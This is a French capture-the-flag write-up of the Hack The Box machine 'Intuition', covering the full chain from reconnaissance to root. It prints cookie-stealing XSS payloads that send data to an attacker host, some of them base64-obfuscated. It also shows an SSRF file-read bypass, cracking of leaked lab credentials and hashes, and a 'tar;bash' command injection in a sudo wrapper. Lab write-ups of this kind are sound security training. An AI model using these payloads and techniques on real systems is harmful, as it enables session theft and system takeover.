  # Intuition

	echo "10.10.11.15 comprezzor.htb" >> /etc/hosts   
    
	sudo masscan -p1-65535,U:1-65535 10.10.11.15 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.15 -oN nmap.txt
	
Scans classiques.

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                   
Sur le site, on a la possibilité d'uploader un fichier pour le compresser, et il y a la description suivante : 

> Welcome to our file compression service. You can upload text (txt), PDF (pdf), and Word (docx) files to compress them using the LZMA algorithm.    
    
Fuzzing : 

	feroxbuster --silent -u http://comprezzor.htb
    ffuf -H "Host: FUZZ.comprezzor.htb" -u http://comprezzor.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 178

Plusieurs sous-domaines trouvés : 

    auth                    [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 380ms]
    report                  [Status: 200, Size: 3166, Words: 1102, Lines: 109, Duration: 312ms]
    dashboard               [Status: 302, Size: 251, Words: 18, Lines: 6, Duration: 271ms]

Fuzzing 2 : 

    echo "10.10.11.15 auth.comprezzor.htb" >> /etc/hosts 
    echo "10.10.11.15 report.comprezzor.htb" >> /etc/hosts 
    echo "10.10.11.15 dashboard.comprezzor.htb" >> /etc/hosts 
    
    feroxbuster --silent -u http://auth.comprezzor.htb
    feroxbuster --silent -u http://report.comprezzor.htb
    feroxbuster --silent -u http://dashboard.comprezzor.htb

Un login est nécessaire mais on a la possibilité de s'enregistrer normalement.

Sur http://report.comprezzor.htb/report_bug on peut envoyer un rapport à l'équipe. D'après la page http://report.comprezzor.htb/about_reports ce rapport sera envoyé aux développeurs puis à l'administrateur si besoin. 

Cela ressemble beaucoup à un scénario de XSS.

Ensemble de payloads tentés dans le titre du rapport :

    <script>var i=new Image(); i.src="http://10.10.16.13:8000/?cookie="+btoa(document.cookie);</script>
    <script>window.location="http://10.10.16.13:8000/?cookie="+document.cookie;</script>
    <img src=x onerror="fetch('http://10.10.16.13:8000/?cookie='+document.cookie)">
    "><script>new Image().src="http://10.10.16.13:8000/cookie.php?c="+document.cookie;</script>
    <img src=x onerror=eval(atob("d2luZG93LmxvY2F0aW9uPSJodHRwOi8vMTAuMTAuMTYuMTM6ODAwMC8/Y29va2llPSIrZG9jdW1lbnQuY29va2ll")) />
    <img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNi4xMzo4MDAwP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSk='))/>

Les payloads avec mon VPS semblent ne pas marcher, mais les équivalents avec une adresse en 10.10.16.X ont fonctionné une fois.

On reçoit bien le cookie de quelqu'un : 

> - [30/Apr/2024 11:29:47] "GET /?cookie=dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA== HTTP/1.1" 200 -

En décodant cette chaîne puis le token obtenu on obtient :

    {"user_id": 2, "username": "adam", "role": "webdev"}|58f6f725339ce3f69d8552a10696ddebb68b2b57d2e523c08bde868d3a756db8

On devrait donc pouvoir se connecter en tant que cet utilisateur au dashboard trouvé plus haut qui nous refusait l'accès jusqu'ici. 

Burp => Proxy => Settings => Match and replace => Remplacer l'ancien cookie par le nouveau : 

      Cookie: user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4
 
Éventuellement, utiliser la console F12 et remplacer le cookie à la main si il y a des problèmes avec la première méthode.

En se connectant au dashboard, on observe quelques rapports écrits par les membres de l'équipe. 

L'utilisateur actuel a la possibilité de les lire, de les passer en "résolu" ou de leur attacher une haute priorité. C'est sûrement cette dernière option qui permet de monter à l'administrateur.

Requête HTTP à renvoyer avec le bon ID de rapport et le cookie du développeur web : 

    POST /change_priority?report_id=3&priority_level=1 HTTP/1.1
    Host: dashboard.comprezzor.htb
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0
    Cookie: user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4


En faisant le test sur le même rapport contenant la première XSS, on obtient bien un deuxième cookie un peu après : 

    user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
    
Même manipulation pour accéder au dashboard en tant que "vrai administrateur". Quelques boutons en plus : 

- Tout lister
- Créer une sauvegarde
- Créer un rapport au format PDF

La dernière option permet de générer un rapport au format PDF depuis une URL de rapport. J'ai directement pensé à une SSRF et testé le payload "file:///etc/passwd".

Ce payload fonctionne mais seulement avec un espace avant, sinon le site retourne un "Invalid URL". Je ne sais pas si c'était le bypass prévu mais j'ai décidé de partir sur cette voie.

Après vérification, un CVE résumant ce bypass de filtre existe déjà : https://nvd.nist.gov/vuln/detail/CVE-2023-24329

La requête HTTP POST renvoie directement le PDF dans la réponse pour que l'utilisateur puisse le télécharger, on peut donc faire un Intruder sur les principaux fichiers Linux et extraire les réponses longues.

Requête : 

    POST /create_pdf_report HTTP/1.1
    Host: dashboard.comprezzor.htb
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 42
    Cookie: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5

    report_url=%20file%3A%2F%2F%2Fetc%2Fpasswd

Aucun compte pertinent dans /etc/passwd, mais on trouve quelques autres fichiers intéressants, dont notamment "/proc/self/cmdline" (/proc/self/ est un lien symbolique vers le processus courant) qui nous renvoie la chaîne suivante : 

> python3/app/code/app.py

Le payload " file:///app/code/app.py" permet de lire le code source dans ce fichier. C'est une simple petite application Flask classique et le code nous indique le nom de quelques autres fichiers grâce aux imports : 

    from flask import Flask, request, redirect
    from blueprints.index.index import main_bp
    from blueprints.report.report import report_bp
    from blueprints.auth.auth import auth_bp
    from blueprints.dashboard.dashboard import dashboard_bp

    app = Flask(__name__)
    app.secret_key = "7ASS7ADA8RF3FD7"
    app.config['SERVER_NAME'] = 'comprezzor.htb'
    app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024 # Limit file size to 5MB

    ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'} # Add more allowed file extensions if needed

    app.register_blueprint(main_bp)
    app.register_blueprint(report_bp, subdomain='report')
    app.register_blueprint(auth_bp, subdomain='auth')
    app.register_blueprint(dashboard_bp, subdomain='dashboard')

    if __name__ == '__main__':
        app.run(debug=False, host="0.0.0.0", port=80)


Payloads correspondant aux imports : 

- file:///app/code/blueprints/report/report.py
- file:///app/code/blueprints/auth/auth.py
- file:///app/code/blueprints/dashboard/dashboard.py

Dans ce dernier exemple, on trouve des credentials pour un FTP local : 

> try: ftp = FTP('ftp.local') ftp.login(user='ftp_admin', passwd='u3jai8y71s2') ftp.cwd('/')

En mettant l'URL de ce FTP dans le même formulaire, on obtient un PDF avec un directory listing du FTP : 

    ftp://ftp_admin:u3jai8y71s2@ftp.local

En répétant l'opération sur les deux fichiers, on obtient une clé privée SSH et le mot de passe associé dans la note : 

    ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key
    ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt
    

Tous les utilisateurs sont en /nologin dans /etc/passwd, mais en faisant un ssh-keygen sur la clé obtenue on peut voir le commentaire "dev_acc@local" (Key-Rephasing).

Et bien penser à rajouter une ligne vide après la fin de la clé sur Windows, pour éviter l'erreur du format invalide même quand le format est censé être valide.

    ssh-keygen -p -f .\id_rsa_intuition.txt

    ssh -i .\id_rsa_intuition.txt dev_acc@comprezzor.htb
    
    cat user.txt

## Pivoting 1 (Adam)

En fouillant dans le système de fichiers, on trouve une base de données locale liée à l'application Flask : 

    cd /var/www/app/blueprints/auth
    sqlite3 users.db 
    sqlite> .tables
    sqlite> SELECT * FROM users;

On obtient deux hashes :  

    1|admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606|admin
    2|adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43|webdev 
    
Le deuxième est cassable : 

    hashid -m 'sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43'
    
    .\hashcat.exe -m 30120 -a 0 'sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43' .\rockyou.txt --force
    
Résultat :  

    sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray

Ce mot de passe ne fonctionne pas directement en SSH, mais fonctionne pour le deuxième FTP local qui écoute sur le port 21 et que l'on trouve avec l'habituel "netstat -pentula" : 

    ftp adam@127.0.0.1 
    
    ftp> cd backup
    ftp> cd runner1
    ftp> get runner1
    ftp> get runner1.c
    ftp> get run-tests.sh
    
Je n'ai pas directement trouvé quoi faire de cet exécutable ainsi que de son code et j'ai continué l'énumération pour le pivoting.

## Pivoting 2 (Lopez)

Dans le système de fichiers on trouve aussi le mot de passe de Lopez grâce aux logs de Suricata : 

    cd /var/log/suricata
    zgrep -i lopez *.gz
    
> ftp":{"command":"PASS","command_data":"Lopezz1992%123","completion_code":["230"]

On peut se connecter en SSH avec ce compte mais il faut bien mettre l'IP et non pas "comprezzor.htb" puisque ce n'est plus un container mais le vrai serveur et que son hostname est "intuition".

    ssh lopez@10.10.11.15
    
## Élévation de privilèges

    sudo -l 
    
> (ALL : ALL) /opt/runner2/runner2

    strings /opt/runner2/runner2
    
Pas de mot de passe en clair mais quelques lignes intéressantes : 

    0feda17076d793c2ef2870d7427ad4ed
    Invalid tar archive.
    /usr/bin/ansible-galaxy
    %s install %s
    /opt/playbooks/
    Failed to open the playbook directory
    .yml
    %d: %s
    /opt/playbooks/inventory.ini
    /usr/bin/ansible-playbook
    %s -i %s %s%s
    Usage: %s <json_file>
    Failed to open the JSON file
    Error parsing JSON data.

J'ai trouvé quelques ressources sur les élévations de privilèges avec ansible-playbook : 

- https://gtfobins.github.io/gtfobins/ansible-playbook/
- https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/
- https://podalirius.net/fr/writeups/heroctf-2021-devops-box-writeup/#privilege-escalation-to-root 

Ces cas de figure marchent avec les binaires originaux d'Ansible, mais pas pour notre cas de figure à cause du "wrapper" qui fait que l'on utilise ces commandes indirectement.

En essayant de lancer le binaire avec un fichier JSON vide, on a une erreur liée à une clé d'authentification : 

    sudo /opt/runner2/runner2 /tmp/json.txt
    
> Run key missing or invalid.

Cela fait penser aux fichiers trouvés dans le FTP avec Adam. En effet, il y avait pas mal d'informations sur le premier runner, et notamment le hash de la clé + ses premiers caractères : 

    # ./runner run [playbook number] -a [auth code]
    #./runner1 run 1 -a "UHI75GHI****"
    ...
    #define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"
    ...
    
J'ai décidé d'utiliser Hashcat en mode "Mask attack" pour tenter de casser les quatre derniers caractères.

Voir : https://hashcat.net/wiki/doku.php?id=mask_attack

Plusieurs tests ont fonctionné : 

    .\hashcat.exe -m 0 -a 3 '0feda17076d793c2ef2870d7427ad4ed' UHI75GHI?u?u?u?u
    .\hashcat.exe -m 0 -a 3 --custom-charset1=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 '0feda17076d793c2ef2870d7427ad4ed' UHI75GHI?1?1?1?1

Clé obtenue : 

> 0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP

En reprenant les codes trouvés plus haut et en ajoutant les paramètres au fur et à mesure dans un JSON de test, on obtient des erreurs différentes : 

> Run key missing or invalid.<br>
> ...<br>
> Action key missing or invalid.<br>
> ...<br>

Premier exemple de JSON fonctionnel pour lister les playbooks : 

    {
        "run": {
        "action": "list",
        "auth_code": "UHI75GHINKOP"
            }
    }
    
On obtient bien le nom d'un fichier YAML : 

    sudo ./runner2 /tmp/json2.txt

> 1: apt_update.yml

Ce fichier est situé dans /opt/playbooks/ mais impossible d'écrire dans ce dossier puisqu'il appartient à root.

Je n'ai pas pu finir et j'ai trouvé la solution pour la fin de l'élévation sur un forum, il s'agissait apparemment d'une injection de commande dans l'action "install" du script. Cette injection semblait être trouvable en désassemblant et en étudiant le binaire directement.

JSON à utiliser : 

    {
      "run": {
        "action": "install",
        "role_file": "sys-admins-role.tar;bash",
      },
      "auth_code": "UHI75GHINKOP"
    }
    

Copie et exécution : 

    scp .\sys-admins-role-0.0.3.tar.gz lopez@10.10.11.15:/tmp/
    cd /tmp
    gunzip sys-admins-role-0.0.3.tar.gz
    mv /tmp/sys-admins-role-0.0.3.tar "/tmp/sys-admins-role-0.0.3.tar;bash"
    vim /tmp/exp.json
    sudo /opt/runner2/runner2 /tmp/exp.json
    cat /root/root.txt
    
JSON final à utiliser : 

    {
      "run":{
            "action":"install",
            "role_file":"/tmp/sys-admins-role-0.0.3.tar;bash"
            },
      "auth_code":"UHI75GHINKOP"
    }
    
L'archive Tar est un playbook qui sert à mieux gérer les rôles sur Ansible : https://github.com/coopdevs/sys-admins-role/
